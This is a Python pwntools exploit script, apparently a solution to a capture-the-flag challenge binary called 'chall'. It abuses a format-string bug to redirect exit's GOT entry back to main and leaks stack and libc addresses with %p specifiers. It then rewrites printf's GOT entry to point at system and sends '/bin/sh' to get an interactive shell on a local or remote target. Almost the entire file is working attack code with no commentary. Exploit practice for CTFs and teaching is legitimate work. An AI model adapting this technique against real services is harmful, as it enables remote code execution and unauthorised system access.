#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./chall')
libc = elf.libc
context.update(
    log_level='debug',
    terminal=['/usr/bin/x-terminal-emulator','-e']
)

sla = lambda x, y: p.sendlineafter(x, y)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
s = lambda x: p.send(x)
rcall = lambda x: p.recvall(x)
rcud = lambda x: p.recvuntil(x, drop=True)
rcu = lambda x: p.recvuntil(x)
rcl = lambda: p.recvline(0)
rcn = lambda x: p.recv(x)
logi = lambda x, y: log.info(f'{x} = {hex(y)}')
libx = lambda x: libc.address + x
def bleak(x): ret = unpack(x, 'all'); logi('leak', ret); return ret
def hleak(x): ret = eval(x); logi('leak', ret); return ret

def start():
    global libc
    if args.REMOTE:
        return remote("192.168.26.96", 16000)
    elif args.GDB:
        return gdb.debug([elf.path], c)
    else:
        return elf.process()

c = '''
# b* main
set follow-fork-mode parent
c
'''

REMOTE = 'localhost 1337'.replace('nc ', '').split(' ')
HOST = REMOTE[0] if REMOTE else ''
PORT = int(REMOTE[1]) if len(REMOTE) > 1 else 0

p = start()

sl(fmtstr_payload(6, {elf.got['exit']: elf.sym['main']}))
sl(b'START %p | %p | %p | %p')
rcu(b'START ')
stack = hleak(rcud(b' |'))
hleak(rcud(b' |'))
libc.address = hleak(rcud(b' |')) - libc.sym.read - 17
logi('libc', libc.address)

sl(fmtstr_payload(6, {elf.got['printf']: libc.sym['system']}))
sl(b'/bin/sh\x00')

p.interactive()
